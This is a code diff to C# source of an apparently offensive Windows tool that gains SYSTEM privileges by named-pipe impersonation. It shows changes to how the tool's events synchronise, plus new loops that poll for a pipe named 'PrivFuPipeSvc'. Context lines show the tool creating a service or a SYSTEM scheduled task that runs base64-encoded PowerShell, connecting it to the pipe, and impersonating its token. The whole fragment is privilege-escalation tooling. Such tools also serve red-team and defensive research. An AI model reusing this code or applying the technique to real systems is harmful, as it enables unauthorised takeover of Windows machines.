@@ -38,13 +38,22 @@ namespace NamedPipeImpersonation.Library
                 if (Helpers.IsCurrentProcessInJob())
                     creationFlags |= PROCESS_CREATION_FLAGS.CreateBreakawayFromJob;
 
-                Globals.ConnectEventHandle = NativeMethods.CreateEvent(IntPtr.Zero, true, false, "ConnectEvent");
-                Globals.PipeEventHandle = NativeMethods.CreateEvent(IntPtr.Zero, true, false, "ServiceEvent");
+                Globals.ConnectionEvent = NativeMethods.CreateEvent(IntPtr.Zero, true, false, null);
 
-                if ((Globals.ConnectEventHandle == IntPtr.Zero) || (Globals.PipeEventHandle == IntPtr.Zero))
+                if (Globals.ConnectionEvent == IntPtr.Zero)
                 {
                     error = Marshal.GetLastWin32Error();
-                    Console.WriteLine("[-] Failed to create service handling event.");
+                    Console.WriteLine("[-] Failed to create event object for pipe connection.");
+                    Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(error, false));
+                    break;
+                }
+
+                Globals.ThreadCompletionEvent = NativeMethods.CreateEvent(IntPtr.Zero, true, false, null);
+
+                if (Globals.ThreadCompletionEvent == IntPtr.Zero)
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to create event object for thread completion.");
                     Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(error, false));
                     break;
                 }
@@ -93,10 +102,8 @@ namespace NamedPipeImpersonation.Library
                         backgroundThread.Start();
                         pipeServer.WaitForConnection();
                         pipeMessage = pipeReader.ReadToEnd();
-
-                        NativeMethods.SetEvent(Globals.ConnectEventHandle);
-                        NativeMethods.NtWaitForSingleObject(Globals.PipeEventHandle, false, IntPtr.Zero);
-                        NativeMethods.NtClose(Globals.PipeEventHandle);
+                        NativeMethods.NtSetEvent(Globals.ConnectionEvent, out int _);
+                        NativeMethods.NtWaitForSingleObject(Globals.ThreadCompletionEvent, true, IntPtr.Zero);
 
                         if (string.Compare(pipeMessage, "timeout", true) == 0)
                         {
@@ -190,6 +197,12 @@ namespace NamedPipeImpersonation.Library
                 }
             } while (false);
 
+            if (Globals.ConnectionEvent != IntPtr.Zero)
+                NativeMethods.NtClose(Globals.ConnectionEvent);
+
+            if (Globals.ThreadCompletionEvent != IntPtr.Zero)
+                NativeMethods.NtClose(Globals.ThreadCompletionEvent);
+
             if (isImpersonated)
                 NativeMethods.RevertToSelf();
             else
@@ -207,9 +220,24 @@ namespace NamedPipeImpersonation.Library
             IntPtr hService;
             var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));
 
+            for (int i = 0; i < 10000; i++)
+            {
+                foreach (var f in System.IO.Directory.EnumerateFiles(@"\\.\pipe"))
+                {
+                    if (string.Compare(System.IO.Path.GetFileName(f), "PrivFuPipeSvc", true) == 0)
+                    {
+                        Globals.PipeFound = true;
+                        break;
+                    }
+                }
+
+                if (Globals.PipeFound)
+                    break;
+            }
+
             Console.WriteLine("[*] Trying to create and start named pipe client service.");
             Console.WriteLine("    [*] Service Name : {0}", Globals.ServiceName);
-            Thread.Sleep(100);
+
             hService = Utilities.StartNamedPipeClientService();
 
             if (hService == IntPtr.Zero)
@@ -225,8 +253,7 @@ namespace NamedPipeImpersonation.Library
                     Console.WriteLine("[*] Service binary @ {0}", Globals.BinaryPath);
             }
 
-            ntstatus = NativeMethods.NtWaitForSingleObject(Globals.ConnectEventHandle, false, in timeout);
-            NativeMethods.NtClose(Globals.ConnectEventHandle);
+            ntstatus = NativeMethods.NtWaitForSingleObject(Globals.ConnectionEvent, false, in timeout);
 
             if (ntstatus == Win32Consts.STATUS_TIMEOUT)
             {
@@ -272,7 +299,7 @@ namespace NamedPipeImpersonation.Library
                 Console.WriteLine("    [*] Binary Path : {0}", Globals.BinaryPath);
             }
 
-            NativeMethods.SetEvent(Globals.PipeEventHandle);
+            NativeMethods.NtSetEvent(Globals.ThreadCompletionEvent, out int _);
         }
 
 
@@ -285,6 +312,21 @@ namespace NamedPipeImpersonation.Library
             var args = string.Format("-EncodedCommand {0}",
                 Convert.ToBase64String(Encoding.Unicode.GetBytes(poshCode)));
             var binpath = "powershell.exe";
+
+            for (int i = 0; i < 10000; i++)
+            {
+                foreach (var f in System.IO.Directory.EnumerateFiles(@"\\.\pipe"))
+                {
+                    if (string.Compare(System.IO.Path.GetFileName(f), "PrivFuPipeSvc", true) == 0)
+                    {
+                        Globals.PipeFound = true;
+                        break;
+                    }
+                }
+
+                if (Globals.PipeFound)
+                    break;
+            }
 
             Console.WriteLine("[*] Trying to create and start a SYSTEM task.");
             Console.WriteLine("    [*] Task Name  : {0}", Globals.ServiceName);
@@ -302,8 +344,7 @@ namespace NamedPipeImpersonation.Library
             else
                 Console.WriteLine("[-] Failed to create SYSTEM task: {0}", exception.Message);
 
-            ntstatus = NativeMethods.NtWaitForSingleObject(Globals.ConnectEventHandle, false, in timeout);
-            NativeMethods.NtClose(Globals.ConnectEventHandle);
+            ntstatus = NativeMethods.NtWaitForSingleObject(Globals.ConnectionEvent, false, in timeout);
 
             if (ntstatus == Win32Consts.STATUS_TIMEOUT)
             {
@@ -319,7 +360,7 @@ namespace NamedPipeImpersonation.Library
                 catch { }
             }
 
-            NativeMethods.SetEvent(Globals.PipeEventHandle);
+            NativeMethods.NtSetEvent(Globals.ThreadCompletionEvent, out int _);
         }
     }
 }
